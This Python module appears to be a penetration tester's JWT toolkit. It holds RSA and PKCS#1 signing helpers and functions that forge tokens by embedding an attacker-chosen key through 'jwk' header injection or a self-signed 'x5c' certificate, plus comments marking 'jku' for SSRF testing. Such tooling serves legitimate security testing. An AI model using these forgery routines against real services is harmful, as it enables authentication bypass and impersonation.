from OpenSSL import crypto
from binascii import hexlify 
import base64
import requests
import json 
import glob
import jwt
import datetime
import random
import re
from hashlib import sha256, md5, sha1
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from Crypto.Util.asn1 import DerSequence, DerNull, DerOctetString, DerObjectId # PyCryptodome
#from Crypto.Util.number import ceil_div, bytes_to_long, long_to_bytes

def urlsafeencode(value):
    if isinstance(value, str):
        return base64.urlsafe_b64encode(value.encode()).rstrip(b'=').decode()
    elif isinstance(value, bytes):
        return base64.urlsafe_b64encode(value).rstrip(b'=').decode()
    else:
        raise Exception('Input type not supported')

def urlsafedecode(value: str):
    return base64.urlsafe_b64decode(value + '==')


def ceil(a, b):
    return a // b + (a % b > 0)


def bytes_to_integer(data):
    return int.from_bytes(data, byteorder="big")


def integer_to_bytes(number):   
    bl = ceil(number.bit_length(), 8) # get number of bytes
    return number.to_bytes(bl, byteorder="big")


def gen_public_key_keyid(pub_key_obj):
    return base64.urlsafe_b64encode(sha256(pub_key_obj.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)).digest()).decode().rstrip('=')


def gen_timestamp():
    return int(datetime.datetime.timestamp(datetime.datetime.now(datetime.timezone.utc)))


def jwk_entry_to_public(entry):
    e = bytes_to_integer(urlsafedecode(entry['e']))
    n = bytes_to_integer(urlsafedecode(entry['n']))
    pn = RSAPublicNumbers(e, n)
    public_key = pn.public_key(backend=default_backend())
    return {'kid': entry['kid'], 'key': public_key}


def jwk_file_to_public(jwk_file):
    jj = json.load(open(jwk_file))
    out = {}
    for key in jj['keys']:
        kk = jwk_entry_to_public(key)
        out[kk['kid']] = kk['key']
    return out


def public_to_pem(public_key):
    return public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)

def public_to_pem_pkcs1(public_key):
    return public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.PKCS1)


def key_to_jwk(key):
    pub = key.public_key()
    n = base64.urlsafe_b64encode(integer_to_bytes(pub.public_numbers().n)).decode('utf8').rstrip('=')
    e = base64.urlsafe_b64encode(integer_to_bytes(pub.public_numbers().e)).decode('utf8').rstrip('=')
    kid = gen_public_key_keyid(pub)
    return {'kty': 'RSA', 'alg': 'RS256', 'kid': kid, 'use': 'sig', 'n': n, 'e': e}



audience = ''

# simple JWK inclusion JWT forgery example
# key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
def forge_with_jwk(claims, key, alg='RS256', exp_offset=3600):
    jwk = key_to_jwk(key)
    kid = jwk['kid']
    claims['iat'] = gen_timestamp()
    claims['exp'] = claims['iat'] + exp_offset
    if 'nbf' in claims:
        claims['nbf'] = claims['iat']
    return jwt.encode(claims, key, algorithm=alg, headers={'kid': kid, 'jwk': jwk})


#Authorization: Bearer [token]

# Modified fropm https://gist.github.com/bloodearnest/9017111a313777b9cce5
def generate_selfsigned_cert(hostname, key, extra_names=None):
    """Generates self signed certificate for a hostname, and optional IP addresses."""
    
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, hostname)
    ])
 
    # best practice seem to be to include the hostname in the SAN, which *SHOULD* mean COMMON_NAME is ignored.    
    alt_names = [x509.DNSName(hostname)]
    
    # allow addressing by IP, for when you don't have real DNS (common in most testing scenarios 
    if extra_names:
        for addr in extra_names:
            # openssl wants DNSnames for ips...
            alt_names.append(x509.DNSName(addr))
            # ... whereas golang's crypto/tls is stricter, and needs IPAddresses
            # note: older versions of cryptography do not understand ip_address objects
            if re.match(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$', addr):
                import ipaddress
                alt_names.append(x509.IPAddress(ipaddress.ip_address(addr)))
    
    san = x509.SubjectAlternativeName(alt_names)
    
    # path_len=0 means this cert can only sign itself, not other certs.
    basic_contraints = x509.BasicConstraints(ca=True, path_length=0)
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(1000)
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=10*365))
        .add_extension(basic_contraints, False)
        .add_extension(san, False)
        .sign(key, hashes.SHA256(), default_backend())
    )
    #cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
    cert_der = cert.public_bytes(encoding=serialization.Encoding.DER)

    return cert_der


# uses jwt library
def make_token(pem_bytes, kid, target_service):
    headers = {
        'kid' : kid,
        'alg' : 'RS256',
    }
    now = datetime.datetime.now(tz=datetime.timezone.utc)
    exp = now + datetime.timedelta(minutes=60)
    claims = {
        'aud': target_service, # target service identifier
        'iss': kid.split('.')[0], # issueing client matching the kid prefix
        'iat': now, # issue time, not in future
        'exp' : exp # expiry time, no more than hour after iat
    }

    return jwt.encode(claims, pem_bytes, algorithm="RS256", headers=headers)



#https://github.com/alexandru-dinu/bleichenbacher/blob/master/src/main.py

def PKCS1_encode(message, total_bytes):
    """
    Encodes the given message using PKCS1 v1.5 scheme:
    PKCS1(M) = 0x00 | 0x02 | [non-zero padding bytes] | 0x00 | [M]
    length(PKCS1(M)) = total_bytes
    """

    # 11 = 3 constant bytes and at aleast 8 bytes for padding
    if len(message) > total_bytes - 11:
        raise Exception("Message to big for encoding scheme!")

    pad_len = total_bytes - 3 - len(message)

    # non-zero padding bytes
    padding = bytes(random.sample(range(1, 256), pad_len))

    encoded = b"\x00\x02" + padding + b"\x00" + message

    return encoded


def PKCS1_decode(encoded):
    """
    Decodes a PKCS1 v1.5 string.
    Remove constant bytes and random pad until arriving at "\x00".
    The rest is the message.
    """

    encoded = encoded[2:]
    idx = encoded.index(b"\x00")

    message = encoded[idx + 1 :]

    return message


# this apears to be the simplest encoding type usable for RSA256 JWT
def PKCS1_simple(message, total_bytes):
    # 11 = 3 constant bytes and at aleast 8 bytes for padding
    if len(message) > total_bytes - 11:
        raise Exception("Message to big for encoding scheme!")

    pad_len = total_bytes - 3 - len(message)    
    padding = b''.join(([b'\xff'] * pad_len))  
    
    return b"\x00\x01" + padding + b"\x00" + message



def pkcs1_v1_5_encode_md5(msg, length):
    return emsa_pkcs1_v1_5_encode(msg, length, algorithm='md5')

def pkcs1_v1_5_encode_sha1(msg, length):
    return emsa_pkcs1_v1_5_encode(msg, length, algorithm='sha1')

def pkcs1_v1_5_encode_sha256(msg, length):
    return emsa_pkcs1_v1_5_encode(msg, length, with_hash_parameters=False, algorithm='sha256')


# PKCS encoding, expects pre-hashed input in msg, emLen should be modulus length of public key used to encrypt
def emsa_pkcs1_v1_5_encode(msg, emLen, with_hash_parameters=True, algorithm='sha256'): # EMSA_PKCS1_V1_5_ENCODE
    oids = {
        'sha256' : '2.16.840.1.101.3.4.2.1',
        'md5' : '1.2.840.113549.2.5',
        'md4' : '1.2.840.113549.2.4',
        'md2' : '1.2.840.113549.2.2',
        'sha1' : '1.3.14.3.2.26'
    }
    digestAlgo = DerSequence([ DerObjectId(oids[algorithm]).encode() ])
    
    # MD2/4/5 hashes always require NULL params in AlgorithmIdentifier, for all others it is optional
    if with_hash_parameters:
        digestAlgo.append(DerNull().encode())

    digest      = DerOctetString(msg)
    digestInfo  = DerSequence([digestAlgo.encode(), digest.encode()]).encode()

    # We need at least 11 bytes for the remaining data: 3 fixed bytes and at least 8 bytes of padding).
    if emLen<len(digestInfo)+11:
        raise TypeError("Selected hash algorithm has a too long digest (%d bytes)." % len(digest))
    PS = b'\xFF' * (emLen - len(digestInfo) - 3)
    return b'\x00\x01' + PS + b'\x00' + digestInfo



def rsa_encrypt(data, n, d):
    data_int = bytes_to_integer(data) 
    enc_int = pow(data_int, d, n)
    return integer_to_bytes(enc_int)


# this adds zero padding to start - might not be appropriate in all cases but needed for pkcs1v15 encoded data
def rsa_decrypt(data, n, e):
    data_int = bytes_to_integer(data) 
    dec_int = pow(data_int, e, n)
    dec_bytes = integer_to_bytes(dec_int)
    mod_length = ceil(n.bit_length(), 8)
    if len(dec_bytes) < mod_length: # zero pad front of number if size less than n
        dec_bytes = b''.join(([b'\x00'] * (mod_length-len(dec_bytes)))) + dec_bytes
    return dec_bytes



# equivalent implementation of privkey.sign(msg, padding.PKCS1v15(), hashes.SHA256())
def rsa_sign_manual(msg, privkey, padding=emsa_pkcs1_v1_5_encode, hash_algorithm=sha256):
    hash = hash_algorithm(msg).digest() # hash message
    encoding = padding(hash, int(privkey.key_size/8)) # pkcs15 encoding
    return rsa_encrypt(encoding, privkey.private_numbers().public_numbers.n, privkey.private_numbers().d)


# returns dict showing original and generated signature and whether they match
def rsa_verify_manual(msg, signature, e=None, n=None, pem=None, padding=emsa_pkcs1_v1_5_encode):
    if not pem and not e and n:
        raise Exception('No key info')
    if pem:
        privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
        e = privkey.public_key().public_numbers().e
        n = privkey.public_key().public_numbers().n
    encoded = rsa_decrypt(signature, n, e)

    compare = padding(sha256(msg).digest(), 256)
    return {'calculated': encoded, 'compare' : compare, 'match': compare==encoded}


# works against jku key set resolved to dict from json looking up key by kid
def pubkey_lookup(keys, kid):
    matching = [a for a in keys if kid == a['kid']]
    if not matching:
        raise Exception('No kid matching: {}'.format(kid))
    e = bytes_to_integer(urlsafedecode(matching[0]['e']))
    n = bytes_to_integer(urlsafedecode(matching[0]['n']))
    return {'e': e, 'n': n}


# dump out and verify data in jwt for troubleshooting using public key e and n values as numbers
def verify_token(token, e, n):
    msg = '.'.join(token.split('.')[0:2]).encode()
    signature = urlsafedecode(token.split('.')[-1])
    res = rsa_verify_manual(msg, signature, e=e, n=n)
    return {**res, **{'headers': urlsafedecode(token.split('.')[0]), 'claims': urlsafedecode(token.split('.')[1])}}


#gets public key in printable pem format from private key pem data
def get_public_key(pem):
    privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
    return privkey.public_key().public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.PKCS1).decode()



# x5c is a chain, defined as a list of strings, ordered with signer first
# https://www.rfc-editor.org/rfc/rfc7515#section-4.1.6
# Each string in the array is a base64-encoded (Section 4 of [RFC4648] -- not base64url-encoded) DER [ITU.X690.2008] PKIX certificate value.  
# The certificate containing the public key corresponding to the key used to digitally sign the  JWS MUST be the first certificate.  This MAY be followed by
# additional certificates, with each subsequent certificate being the one used to certify the previous one. 

# based on token format here: https://blog.pentesteracademy.com/hacking-jwt-tokens-x5c-claim-misuse-4b8582281db1
def make_token_x5c(pem, kid, target_service, cert_hostname=None, padding=emsa_pkcs1_v1_5_encode, hash_algorithm=sha256):
    hn = cert_hostname if cert_hostname else target_service
    privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
    e = urlsafeencode(integer_to_bytes(privkey.public_key().public_numbers().e))
    n = urlsafeencode(integer_to_bytes(privkey.public_key().public_numbers().n))
    cert = generate_selfsigned_cert(hn, privkey)
    
    headers = {
        'kid' : kid,
        'alg' : 'RS256',
        'typ' : 'JWT',
        'x5t' : urlsafeencode(sha1(cert).hexdigest().upper()),
        'x5t#s256': urlsafeencode(sha256(cert).hexdigest().upper()),
        'x5c': [base64.b64encode(cert).decode()], 
        'kty' : 'RSA',
        'use' : 'sig',
        'n' : n,
        'e': e
    }
    headers_data = json.dumps(headers)
    now = datetime.datetime.now(tz=datetime.timezone.utc)
    exp = int((now + datetime.timedelta(minutes=60)).timestamp())
    now = int(now.timestamp())
    claims = {
        'aud': target_service, # target service identifier
        'iss': kid.split('.')[0], # issueing client matching the kid prefix
        'iat': now, # issue time, not in future
        'exp' : exp, # expiry time, no more than hour after iat
    }
    claims_data = json.dumps(claims)
    eheader = urlsafeencode(headers_data)
    eclaims = urlsafeencode(claims_data)
    msg = '{}.{}'.format(eheader, eclaims).encode()
    
    sig = rsa_sign_manual(msg, privkey, padding=padding, hash_algorithm=hash_algorithm)

    return '{}.{}.{}'.format(eheader, eclaims, urlsafeencode(sig))



def make_token_manual(pem, kid, target_service, padding=emsa_pkcs1_v1_5_encode, hash_algorithm=sha256):

    headers = {
        'kid' : kid,
        'alg' : 'RS256',
        'typ' : 'JWT',
        #'jku': 'SSRF test URL',
        #'iss': 'issuer'
    }
    headers_data = json.dumps(headers)
    #headers_data = '{"kid": "'+kid+'", "alg": "RS256", "typ": "JWT", "Kid": "whatever"}'
    now = datetime.datetime.now(tz=datetime.timezone.utc)
    exp = int((now + datetime.timedelta(minutes=1)).timestamp())
    exp2 = int((now + datetime.timedelta(minutes=120)).timestamp())
    now = int(now.timestamp())
    claims = {
        'aud': target_service, # target service identifier
        'iss': kid.split('.')[0], # issueing client matching the kid prefix
        'iat': now, # issue time, not in future
        'exp' : exp, # expiry time, no more than hour after iat
        #'jku': 'SSRF test URL'
    }
    claims_data = json.dumps(claims)
    #claims_data = '{"aud": "' + target_service + '", "iss": "' + kid.split('.')[0] + '", "iat": ' + str(now) + ', "exp": ' + str(exp) + ', "Exp": ' + str(exp2) + '}'
    eheader = urlsafeencode(headers_data)
    eclaims = urlsafeencode(claims_data)
    msg = '{}.{}'.format(eheader, eclaims).encode()
    privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
    sig = rsa_sign_manual(msg, privkey, padding=padding, hash_algorithm=hash_algorithm)

    return '{}.{}.{}'.format(eheader, eclaims, urlsafeencode(sig))



def make_token_jwk(pem, kid, target_service, padding=emsa_pkcs1_v1_5_encode, hash_algorithm=sha256):
    privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
    e = urlsafeencode(integer_to_bytes(privkey.public_key().public_numbers().e))
    n = urlsafeencode(integer_to_bytes(privkey.public_key().public_numbers().n))
    jwk = {
        'kty' : 'RSA',
        'use' : 'sig',
        'kid': kid,
        'n' : n,
        'e': e
    }
    headers = {
        'kid' : kid,
        'alg' : 'RS256',
        'typ' : 'JWT',
        'jwk': jwk
    }
    headers_data = json.dumps(headers)
    now = datetime.datetime.now(tz=datetime.timezone.utc)
    exp = int((now + datetime.timedelta(minutes=60)).timestamp())
    now = int(now.timestamp())
    claims = {
        'aud': target_service, # target service identifier
        'iss': kid.split('.')[0], # issueing client matching the kid prefix
        'iat': now, # issue time, not in future
        'exp' : exp, # expiry time, no more than hour after iat
        'jwk': jwk
    }
    claims_data = json.dumps(claims)
    eheader = urlsafeencode(headers_data)
    eclaims = urlsafeencode(claims_data)
    msg = '{}.{}'.format(eheader, eclaims).encode()
    privkey = crypto.load_privatekey(crypto.FILETYPE_PEM, pem).to_cryptography_key()
    sig = rsa_sign_manual(msg, privkey, padding=padding, hash_algorithm=hash_algorithm)

    return '{}.{}.{}'.format(eheader, eclaims, urlsafeencode(sig))



def bare_to_pem(b64data):
    t = '{}{} RSA PRIVATE KEY{}'
    return  '\n'.join([t.format('-' * 5, 'BEGIN', '-' * 5)] + [b64data[a:a+64] for a in range(0, len(b64data), 64)] + [t.format('-' * 5, 'END', '-' * 5), ''])




def get_pkey_public_numbers(pem_key_content: str):
    privkey1 = crypto.load_privatekey(crypto.FILETYPE_PEM, pem_key_content)
    cprivkey1 = privkey1.to_cryptography_key()
    pn = cprivkey1.public_key().public_numbers()
    return {'e' : pn.e, 'n': pn.n, 'keysize': cprivkey1.key_size}



def get_numeric(val):
    return int(hexlify(base64.urlsafe_b64decode(val + '==')), 16)


def get_env_keydata(url):
    r = requests.get(url)
    if r.status_code != 200:
        raise Exception('Bad HTTP response {}'.format(r.content))
    data = json.loads(r.content)
    out = data['keys']
    for a in range(0, len(out)):
        try:
            out[a]['e.int'] = get_numeric(out[a]['e'])
            out[a]['n.int'] = get_numeric(out[a]['n'])
            out[a]['n.hex'] = hexlify(base64.urlsafe_b64decode(out[a]['n'] + '==')).decode()
        except:
            import ipdb 
            ipdb.set_trace()
    return out

def get_dir_public_data(basedir='.', extension='.pem'):
    files = glob.glob('{}/*{}'.format(basedir, extension))
    #print(files)
    out= {}
    for file in files:
        out[file] = get_pkey_public_numbers(open(file).read())
    return out


def match_keys(key_data, dev_keys, prod_keys):
    out = {'matching_dev_keys' : [], 'matching_prod_keys': []}
    for key in key_data:
        m1 = [a['kid'] for a in dev_keys if a['n.int'] == key_data[key]['n']]
        if m1:
            out['matching_dev_keys'] += [{key : m1[0] }]
        m2 = [a['kid'] for a in prod_keys if a['n.int'] == key_data[key]['n']]
        if m2:
            out['matching_prod_keys'] += [{key: m2[0] }]
    return out


#dev_keys = get_env_keydata(dev_keys_url)
#prod_keys = get_env_keydata(prod_keys_url)
#key_data = get_dir_public_data()
#match_keys(key_data, dev_keys, prod_keys)
